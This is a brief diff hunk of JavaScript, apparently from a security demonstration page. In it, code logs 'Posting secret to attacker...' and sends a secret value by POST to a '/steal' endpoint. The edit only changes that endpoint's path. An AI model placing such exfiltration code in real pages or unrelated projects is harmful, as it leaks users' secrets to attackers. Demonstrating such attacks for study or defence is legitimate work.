@@ -14,7 +14,7 @@
       document.getElementById('log').innerText = 'Posting secret to attacker...';
       try {
         const start = Date.now();
-        const resp = await fetch('/api/steal', {
+        const resp = await fetch('/steal', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ secret })
